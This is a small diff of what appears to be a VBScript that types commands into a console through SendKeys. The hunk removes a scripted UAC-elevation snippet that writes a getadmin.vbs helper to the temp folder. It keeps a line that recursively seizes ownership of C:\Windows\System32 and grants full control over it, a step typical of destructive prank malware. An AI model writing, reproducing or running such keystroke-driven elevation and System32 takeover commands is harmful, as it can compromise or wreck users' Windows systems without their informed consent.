@@ -37,11 +37,6 @@ Wshshell.SendKeys "{ENTER}"
 WScript.Sleep 100
 
 
-WshShell.SendKeys "(>nul 2>&1 %SYSTEMROOT%\system32\cacls.exe %SYSTEMROOT%\system32\config\system ||  Set UAC = CreateObject^(Shell.Application^) > %temp%\getadmin.vbs"
-
-
-WshShell.SendKeys "{ENTER}"
-
 
 WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y icacls C:\Windows\System32 /grant administrators:F /t "
 
